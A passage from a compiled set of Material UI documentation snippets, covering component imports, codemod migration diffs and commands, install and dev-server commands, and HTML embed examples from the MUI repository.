Material-UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/textarea-autosize/textarea-autosize.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport TextareaAutosize from '@mui/material/TextareaAutosize';\n```\n\n----------------------------------------\n\nTITLE: Running @mui/envinfo via npx to get system environment information\nDESCRIPTION: This command demonstrates how to use npx to run the @mui/envinfo package, which displays system information, installed binaries, browsers, and relevant npm packages installed in the current environment. This information is useful when reporting issues to the MUI team.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-envinfo/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ npx @mui/envinfo\n\n  System:\n    OS: Linux 5.4 Ubuntu 20.04.1 LTS (Focal Fossa)\n  Binaries:\n    Node: 12.20.0 - ~/.nvm/versions/node/v12.20.0/bin/node\n    Yarn: 1.22.4 - /usr/bin/yarn\n    npm: 6.14.8 - ~/.nvm/versions/node/v12.20.0/bin/npm\n  Browsers:\n    Chrome: 87.0.4280.66\n    Firefox: 83.0\n  npmPackages:\n    @emotion/react: ^11.0.0 => 11.1.1\n    @emotion/styled: ^11.0.0 => 11.0.0\n    @mui/codemod:  5.0.0-alpha.17\n    @mui/material:  5.0.0-alpha.18\n    @mui/docs:  5.0.0-alpha.1\n    @mui/envinfo:  2.0.0\n    @mui/icons-material:  5.0.0-alpha.15\n    @mui/lab:  5.0.0-alpha.18\n    @mui/styled-engine:  5.0.0-alpha.18\n    @mui/styled-engine-sc:  5.0.0-alpha.18\n    @mui/styles:  5.0.0-alpha.18\n    @mui/system:  5.0.0-alpha.18\n    @mui/types:  5.1.0\n    @mui/base:  5.0.0-alpha.18\n    @mui/utils:  5.0.0-alpha.18\n    @types/react: ^17.0.0 => 17.0.0\n    react: ^16.14.0 => 16.14.0\n    react-dom: ^16.14.0 => 16.14.0\n    styled-components:  5.2.1\n    typescript: ^4.0.2 => 4.0.5\n```\n\n----------------------------------------\n\nTITLE: Updating Chip Component Class Names in CSS\nDESCRIPTION: Shows the transformation of Chip component CSS class names. The changes separate combined classes into individual classes and change the selector pattern to use child selectors for nested elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiChip-clickableColorPrimary\n+.MuiChip-clickable.MuiChip-colorPrimary\n-.MuiChip-clickableColorSecondary\n+.MuiChip-clickable.MuiChip-colorSecondary\n-.MuiChip-deletableColorPrimary\n+.MuiChip-deletable.MuiChip-colorPrimary\n-.MuiChip-deletableColorSecondary\n+.MuiChip-deletable.MuiChip-colorSecondary\n-.MuiChip-outlinedPrimary\n+.MuiChip-outlined.MuiChip-colorPrimary\n-.MuiChip-outlinedSecondary\n+.MuiChip-outlined.MuiChip-colorSecondary\n-.MuiChip-filledPrimary\n+.MuiChip-filled.MuiChip-colorPrimary\n-.MuiChip-filledSecondary\n+.MuiChip-filled.MuiChip-colorSecondary\n-.MuiChip-root .MuiChip-avatarSmall\n+.MuiChip-root.MuiChip-sizeSmall > .MuiChip-avatar\n-.MuiChip-root .MuiChip-avatarMedium\n+.MuiChip-root.MuiChip-sizeMedium > .MuiChip-avatar\n-.MuiChip-root .MuiChip-avatarColorPrimary\n+.MuiChip-root.MuiChip-colorPrimary > .MuiChip-avatar\n-.MuiChip-root .MuiChip-avatarColorSecondary\n+.MuiChip-root.MuiChip-colorSecondary > .MuiChip-avatar\n-.MuiChip-root .MuiChip-iconSmall\n+.MuiChip-root.MuiChip-sizeSmall > .MuiChip-icon\n-.MuiChip-root .MuiChip-iconMedium\n+.MuiChip-root.MuiChip-sizeMedium > .MuiChip-icon\n-.MuiChip-root .MuiChip-iconColorPrimary\n+.MuiChip-root.MuiChip-colorPrimary > .MuiChip-icon\n-.MuiChip-root .MuiChip-iconColorSecondary\n+.MuiChip-root.MuiChip-colorSecondary > .MuiChip-icon\n-.MuiChip-root .MuiChip-labelSmall\n+.MuiChip-root.MuiChip-sizeSmall > .MuiChip-label\n-.MuiChip-root .MuiChip-labelMedium\n+.MuiChip-root.MuiChip-sizeMedium > .MuiChip-label\n-.MuiChip-root .MuiChip-deleteIconSmall\n+.MuiChip-root.MuiChip-sizeSmall > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconMedium\n+.MuiChip-root.MuiChip-sizeMedium > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconColorPrimary\n+.MuiChip-root.MuiChip-colorPrimary > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconColorSecondary\n+.MuiChip-root.MuiChip-colorSecondary > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconOutlinedColorPrimary\n+.MuiChip-root.MuiChip-outlined.MuiChip-colorPrimary > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconOutlinedColorSecondary\n+.MuiChip-root.MuiChip-outlined.MuiChip-colorSecondary > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconFilledColorPrimary\n+.MuiChip-root.MuiChip-filled.MuiChip-colorPrimary > .MuiChip-deleteIcon\n-.MuiChip-root .MuiChip-deleteIconFilledColorSecondary\n+.MuiChip-root.MuiChip-filled.MuiChip-colorSecondary > .MuiChip-deleteIcon\n```\n\n----------------------------------------\n\nTITLE: Running Button Classes Codemod\nDESCRIPTION: Command to automatically update Button component class names using the MUI codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/button-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Importing CardOverflow Component\nDESCRIPTION: Import statement for the CardOverflow component, which is used as a wrapper to eliminate whitespace and expand content to fill all edges of a Card.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/card/card.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport CardOverflow from '@mui/joy/CardOverflow';\n```\n\n----------------------------------------\n\nTITLE: Updating Flat Button Variant\nDESCRIPTION: Diff showing the migration from the deprecated 'flat' button variant to the new 'text' variant.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n-<Button variant=\"flat\" />\n+<Button variant=\"text\" />\n```\n\n----------------------------------------\n\nTITLE: Rendering Template Collection Component in Markdown\nDESCRIPTION: This code snippet embeds a React component called TemplateCollection.js into the markdown document. It uses a custom syntax to render the demo with specific options like hiding the toolbar and setting the background to inline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/templates/index.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{{\"demo\": \"TemplateCollection.js\", \"hideToolbar\": true, \"bg\": \"inline\"}}\n```\n\n----------------------------------------\n\nTITLE: Rendering Material UI Design Resources Component in Markdown\nDESCRIPTION: This code snippet embeds a React component that displays Material UI design resources. It uses a custom syntax to include a JavaScript module within the Markdown file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/design-resources/design-resources.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{{\"component\": \"modules/components/MaterialUIDesignResources.js\"}}\n```\n\n----------------------------------------\n\nTITLE: Updating Dialog Component Class Patterns in JavaScript\nDESCRIPTION: Demonstrates changes to MUI Dialog component class patterns. Updates selectors to separate the scroll behavior class from the paper element class.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n import { dialogClasses } from '@mui/material/Dialog';\n\n MuiDialog: {\n   styleOverrides: {\n     root: {\n-      [`& .${dialogClasses.paperScrollBody}`]: {\n+      [`& .${dialogClasses.scrollBody} > .${dialogClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`& .${dialogClasses.paperScrollPaper}`]: {\n+      [`& .${dialogClasses.scrollPaper} > .${dialogClasses.paper}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: ImageListItemBar Classes Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated ImageListItemBar class selectors using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_47\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/image-list-item-bar-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Updating TextField and TextareaAutosize Row Props\nDESCRIPTION: Transforms the rowsMin/rowsMax props to minRows/maxRows in TextField and TextareaAutosize components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_114\n\nLANGUAGE: diff\nCODE:\n```\n-<TextField rowsMin={3} rowsMax={6} />\n-<TextareaAutosize rows={2} />\n-<TextareaAutosize rowsMin={3} rowsMax={6} />\n+<TextField minRows={3} maxRows={6} />\n+<TextareaAutosize minRows={2} />\n+<TextareaAutosize minRows={3} maxRows={6} />\n```\n\n----------------------------------------\n\nTITLE: Implementing a Material UI Slider with Custom CSS (JSX)\nDESCRIPTION: This React component (`PlainCssSliderDeep1`) renders two Material UI `Slider` components. Both have a default value of 30. The second slider additionally has the class name `slider` applied, presumably for custom styling defined in the imported `PlainCssSliderDeep1.css` file. Requires React, `@mui/material` and a CSS file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n```jsx title=\"PlainCssSliderDeep1.js\"\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './PlainCssSliderDeep1.css';\n\nexport default function PlainCssSliderDeep1() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className=\"slider\" />\n    </div>\n  );\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Embedding Media Content in Markdown - HTML Video for Animation Demo\nDESCRIPTION: This snippet embeds a demonstration animation using the <video> HTML tag within a Markdown document. It applies inline styling to control video dimensions and margin, and uses multiple attributes for automatic, muted, looping, and inline playback. Developers should verify that the video format is widely supported and that inline HTML rendering is enabled in documentation tools.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<video style=\"max-height: 95px; margin-bottom: 24px;\" autoplay muted loop playsinline>\n  <source src=\"/static/blog/2020-q1-update/skeleton.webm\" type=\"video/webm\" />\n</video>\n```\n\n----------------------------------------\n\nTITLE: Updating MUI System Package Version\nDESCRIPTION: Changes required in package.json to use the beta release of MUI System v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n-\"@mui/system\": \"latest\",\n+\"@mui/system\": \"next\",\n```\n\n----------------------------------------\n\nTITLE: Installing Pigment CSS with Vite\nDESCRIPTION: Commands to install Pigment CSS and its Vite plugin dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @pigment-css/react\nnpm install --save-dev @pigment-css/vite-plugin\n```\n\n----------------------------------------\n\nTITLE: Embedding Images in Markdown - HTML Image Tag\nDESCRIPTION: This example illustrates embedding an image directly into a Markdown document with the <img> HTML tag. The src, alt, and style attributes control the image's source, accessibility text, and styling such as size and margin. This approach is useful for fine-tuned presentation where Markdown's default image syntax is insufficient. Verify that paths to images are correct and that the Markdown processor supports raw HTML.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"/static/blog/2020-q1-update/sketch.png\" alt=\"sketch\" style=\"max-width: 160px;\" />\n```\n\n----------------------------------------\n\nTITLE: Importing Paper Component in React\nDESCRIPTION: Basic import statement for the Paper component from Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/paper/paper.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Paper from '@mui/material/Paper';\n```\n\n----------------------------------------\n\nTITLE: Adding Prepend Option to Emotion Cache in React\nDESCRIPTION: Adds 'prepend: true' to Emotion 'createCache' configuration. This codemod updates the Emotion cache configuration to ensure proper style injection order in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_81\n\nLANGUAGE: diff\nCODE:\n```\n const cache = emotionCreateCache({\n   key: 'css',\n+  prepend: true,\n });\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/create-theme <path>\n```\n\n----------------------------------------\n\nTITLE: Alert Title Import - React/JSX\nDESCRIPTION: Import statement for the AlertTitle component to add titles to Alert elements\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/alert/alert.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport AlertTitle from '@mui/material/AlertTitle';\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Material UI CRA Example\nDESCRIPTION: This command downloads the Material UI Create React App example from GitHub and extracts it to a local directory. It uses curl to fetch the repository archive and tar to extract only the example folder.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra\ncd material-ui-cra\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies and Running the Development Server\nDESCRIPTION: Commands to install the necessary npm packages and start the Next.js development server for the Joy UI TypeScript example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-nextjs-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Installing MUI X Premium Package with yarn - JavaScript\nDESCRIPTION: This snippet shows how to add the MUI X Premium data grid package with yarn, serving as an alternative to npm for managing dependencies. It requires yarn to be installed and should be executed in the repository root. The effect is to add @mui/x-data-grid-premium to the package.json dependencies, enabling access to Premium features.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/premium-plan-release.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nyarn add @mui/x-data-grid-premium\n```\n\n----------------------------------------\n\nTITLE: Updating Checkbox Color\nDESCRIPTION: Changes Checkbox default color to 'primary' requiring explicit 'secondary' color prop if needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n-<Checkbox />\n+<Checkbox color=\"secondary\" />\n```\n\n----------------------------------------\n\nTITLE: Running Tabs Scroll Buttons Codemod Command\nDESCRIPTION: Command to execute the tabs-scroll-buttons codemod on a specified path. This transforms Tabs scrollButtons prop values to the new format in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_113\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/tabs-scroll-buttons <path>\n```\n\n----------------------------------------\n\nTITLE: ListSubheader with Props Implementation\nDESCRIPTION: Alternative implementation of custom ListSubheader using props pattern\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/selects/selects.md#2025-04-22_snippet_4\n\nLANGUAGE: TypeScript\nCODE:\n```\nexport default function MyListSubheader(\n  props: ListSubheaderProps & { muiSkipListHighlight: boolean },\n) {\n  const { muiSkipListHighlight, ...other } = props;\n  return <ListSubheader {...other} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Material UI Component Integration Example\nDESCRIPTION: Markdown code showing the integration of a Material UI component module using a custom syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/example-projects/example-projects.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{{\"component\": \"modules/components/MaterialUIExampleCollection\"}}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Configuration for Custom Info Palette\nDESCRIPTION: TypeScript module augmentation for adding info palette types to Joy UI theme\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nimport type { PaletteRange } from '@mui/joy/styles';\n\ndeclare module '@mui/joy/styles' {\n  interface ColorPalettePropOverrides {\n    info: true;\n  }\n\n  interface Palette {\n    info: PaletteRange;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding Tooltip Arrow Image using Markdown\nDESCRIPTION: Uses Markdown syntax to embed an image showing the new arrow feature added to the Material-UI Tooltip component. The syntax includes alternative text ('Tooltip arrow') and the path to the image file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/november-2019-update.md#2025-04-22_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n![Tooltip arrow](/static/blog/november-2019-update/arrow.png)\n```\n\n----------------------------------------\n\nTITLE: Running Optimal Imports Codemod Command\nDESCRIPTION: Command to execute the optimal-imports codemod on a specified path. This fixes private import paths to use the recommended public import structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_105\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/optimal-imports <path>\n```\n\n----------------------------------------\n\nTITLE: Updating Drawer CSS Classes\nDESCRIPTION: CSS selector transformations for the Drawer component, replacing old paperAnchor* selectors with proper parent-child relationships between anchor positions, docked status, and paper elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_28\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiDrawer-paperAnchorBottom\n+.MuiDrawer-anchorBottom > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorLeft\n+.MuiDrawer-anchorLeft > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorRight\n+.MuiDrawer-anchorRight > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorTop\n+.MuiDrawer-anchorTop > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorDockedBottom\n+.MuiDrawer-docked.MuiDrawer-anchorBottom > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorDockedLeft\n+.MuiDrawer-docked.MuiDrawer-anchorLeft > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorDockedRight\n+.MuiDrawer-docked.MuiDrawer-anchorRight > .MuiDrawer-paper\n-.MuiDrawer-paperAnchorDockedTop\n+.MuiDrawer-docked.MuiDrawer-anchorTop > .MuiDrawer-paper\n```\n\n----------------------------------------\n\nTITLE: Embedding Material-UI ErrorDecoder Demo Component\nDESCRIPTION: This configuration directive is used within the Material-UI documentation system to dynamically embed a React component demo. It specifies the path to the component (`pages/production-error/ErrorDecoder.js`), hides the standard demo toolbar (`hideToolbar: true`), and sets an inline background (`bg: \\\"inline\\\"`). The referenced component (`ErrorDecoder.js`) is intended to help users decode minified production error messages generated by Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/src/pages/production-error/index.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{{\"demo\": \"pages/production-error/ErrorDecoder.js\", \"hideToolbar\": true, \"bg\": \"inline\"}}\n```\n\n----------------------------------------\n\nTITLE: Embedding Blog Chart Image using HTML img Tag\nDESCRIPTION: Displays a chart image within the blog post using an HTML `<img>` tag. The source points to a static image file located within the project's static assets. Inline CSS styles are used to set a specific width (588px) and add bottom margin (16px).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"/static/blog/2020-q3-update/react-share.png\" alt=\"\" style=\"width: 588px; margin-bottom: 16px;\" />\n```\n\n----------------------------------------\n\nTITLE: Migrating Font Icon from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Font Icon components from Material-UI v0.x to v1.x using the new Icon component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-import FontIcon from 'material-ui/FontIcon';\n+import Icon from '@material-ui/core/Icon';\n\n-<FontIcon>home</FontIcon>\n+<Icon>home</Icon>\n```\n\n----------------------------------------\n\nTITLE: Running the Material Icons Builder Build Process\nDESCRIPTION: Commands to install dependencies, build the Material Design Icons, and publish the generated package. This process downloads SVG icons and generates the appropriate JavaScript components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-icons-material/builder.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm install\npnpm build\ncd build\npnpm publish\n```\n\n----------------------------------------\n\nTITLE: Enum Props Type Definition\nDESCRIPTION: Type definition example showing enum props structure for component variations\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/api/api.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\ntype Props = {\n  variant: 'text' | 'contained' | 'fab';\n};\n```\n\n----------------------------------------\n\nTITLE: Switching to Documentation Branch\nDESCRIPTION: Git command to switch to the detached HEAD state at material-ui-docs/latest.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit switch --detach material-ui-docs/latest\n```\n\n----------------------------------------\n\nTITLE: Converting JSS to Styled API in React\nDESCRIPTION: Replaces JSS styling with 'makeStyles' or 'withStyles' to 'styled' API. This codemod helps migrate from JSS to the new styled API in Material-UI v5, including updating class names and styling structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_88\n\nLANGUAGE: diff\nCODE:\n```\n import Typography from '@material-ui/core/Typography';\n-import makeStyles from '@material-ui/styles/makeStyles';\n+import { styled } from '@material-ui/core/styles';\n\n-const useStyles = makeStyles((theme) => ({\n-  root: {\n-    display: 'flex',\n-    alignItems: 'center',\n-    backgroundColor: theme.palette.primary.main\n-  },\n-  cta: {\n-    borderRadius: theme.shape.radius\n-  },\n-  content: {\n-    color: theme.palette.common.white,\n-    fontSize: 16,\n-    lineHeight: 1.7\n-  },\n-}))\n+const PREFIX = 'MyCard';\n+const classes = {\n+  root: `${PREFIX}-root`,\n+  cta: `${PREFIX}-cta`,\n+  content: `${PREFIX}-content`,\n+}\n+const Root = styled('div')((theme) => ({\n+  [`&.${classes.root}`]: {\n+    display: 'flex',\n+    alignItems: 'center',\n+    backgroundColor: theme.palette.primary.main\n+  },\n+  [`& .${classes.cta}`]: {\n+    borderRadius: theme.shape.radius\n+  },\n+  [`& .${classes.content}`]: {\n+    color: theme.palette.common.white,\n+    fontSize: 16,\n+    lineHeight: 1.7\n+  },\n+}))\n\n export const MyCard = () => {\n   const classes = useStyles();\n   return (\n-    <div className={classes.root}>\n+    <Root className={classes.root}>\n       <Typography className={classes.content}>...</Typography>\n       <Button className={classes.cta}>Go</Button>\n-    </div>\n+    </Root>\n   )\n }\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/jss-to-styled <path>\n```\n\n----------------------------------------\n\nTITLE: Instructing on Manual Visual Regression Testing for Material-UI\nDESCRIPTION: This snippet outlines the process for conducting manual visual regression tests in the Material-UI project. It suggests moving the test to a temporary folder and running the visual regression test suite to obtain a screenshot.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/regressions/manual/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# manual visual regression tests\n\nThese are expensive tests that should only be consulted if you suspect that something changed.\nMove the test you want to check inside a temporary folder in `../test` and run the visual regression test suite to get a screenshot.\n```\n\n----------------------------------------\n\nTITLE: Migrating FilledInput Props to Slots API\nDESCRIPTION: Transforms FilledInput component from using the deprecated components/componentsProps API to the new slots/slotProps API pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_30\n\nLANGUAGE: diff\nCODE:\n```\n <FilledInput\n-  components={{ Input: CustomInput, Root: CustomRoot }}\n-  componentsProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n+  slots={{ input: CustomInput, root: CustomRoot }}\n+  slotProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Removing Legacy Grid Props\nDESCRIPTION: Shows how to remove the deprecated 'item' and 'zeroMinWidth' props when migrating to the new Grid component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid item zeroMinWidth>\n+<Grid>\n```\n\n----------------------------------------\n\nTITLE: Accessing CSS Theme Variables in Styled Components (JSX & CSS)\nDESCRIPTION: This snippet demonstrates how to access Material UI CSS theme variables within a styled component using the `theme.vars` object in JSX. It also shows the resulting CSS output, where component styles use the generated CSS variables (e.g., `var(--mui-palette-background-default)`). Requires `cssVariables: true` in theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_1\n\nLANGUAGE: js JSX\nCODE:\n```\nconst CustomComponent = styled('div')(({ theme }) => ({\n  backgroundColor: theme.vars.palette.background.default,\n  color: theme.vars.palette.text.primary,\n}));\n```\n\nLANGUAGE: css CSS\nCODE:\n```\n.CustomComponent-ae73f {\n  background-color: var(--mui-palette-background-default);\n  color: var(--mui-palette-text-primary);\n}\n```\n\n----------------------------------------\n\nTITLE: Running Pigment CSS Vite Demo App in Development Mode\nDESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Vite demo app in development mode for active development and testing.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/README.md#2025-04-22_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\npnpm nx run @app/pigment-css-vite-app:dev\n```\n\n----------------------------------------\n\nTITLE: Running @mui/material Synthetic Benchmark\nDESCRIPTION: Command to run the material UI core components benchmark with results showing operations per second for various button implementations. ButtonBase, HocButton, and NakedButton components are compared, with NakedButton showing the highest performance.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/server/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm server:core\n\nButtonBase x 40,724 ops/sec ±1.58% (189 runs sampled)\nHocButton x 166,229 ops/sec ±1.04% (191 runs sampled)\nNakedButton x 228,473 ops/sec ±0.99% (187 runs sampled)\nButtonBase enable ripple x 56,019 ops/sec ±0.87% (189 runs sampled)\nButtonBase disable ripple x 61,748 ops/sec ±0.35% (190 runs sampled)\n```\n\n----------------------------------------\n\nTITLE: TypeScript Module Augmentation for Table Props in Joy UI\nDESCRIPTION: This snippet shows how to add new values to the Table props using TypeScript module augmentation in Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/table/table.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\n// this could be any file that's included in your tsconfig.json\ndeclare module '@mui/joy/Table' {\n  interface TablePropsBorderAxisOverrides {\n    header: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Responsive BrowserStack Logo HTML Implementation\nDESCRIPTION: HTML code for displaying the BrowserStack logo with dark/light mode support using the picture element.\nSOURCE: https://github.com/mui/material-ui/blob/master/README.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://mui.com/static/readme/browserstack-darkmode.svg\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://mui.com/static/readme/browserstack-lightmode.svg\">\n  <img alt=\"BrowserStack logo\" src=\"https://mui.com/static/readme/browserstack-lightmode.svg\" width=\"140\" height=\"25\">\n</picture>\n```\n\n----------------------------------------\n\nTITLE: HTML Structure of Material UI Divider Component\nDESCRIPTION: This HTML snippet illustrates the basic structure of the rendered Divider component, showing its root element and class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dividers/dividers.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<hr class=\"MuiDivider-root\">\n  <!-- Divider children goes here -->\n</hr>\n```\n\n----------------------------------------\n\nTITLE: Updating Modal Props in MUI\nDESCRIPTION: Transformation of Modal component props from components/componentsProps pattern to slots/slotProps pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_58\n\nLANGUAGE: diff\nCODE:\n```\n<Modal\n-  components={{ Root: CustomRoot, Backdrop: CustomBackdrop }}\n-  componentsProps={{ root: { testid: 'root-id' }, backdrop: { testid: 'backdrop-id' } }}\n+  slots={{ root: CustomRoot, backdrop: CustomBackdrop }}\n+  slotProps={{ root: { testid: 'root-id' }, backdrop: { testid: 'backdrop-id' } }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Customizing ScopedCssBaseline Using Themed Components Approach\nDESCRIPTION: This snippet demonstrates how to customize ScopedCssBaseline using Joy UI's themed components approach. It extends the theme with component-specific style overrides for the root slot.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/css-baseline/css-baseline.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { 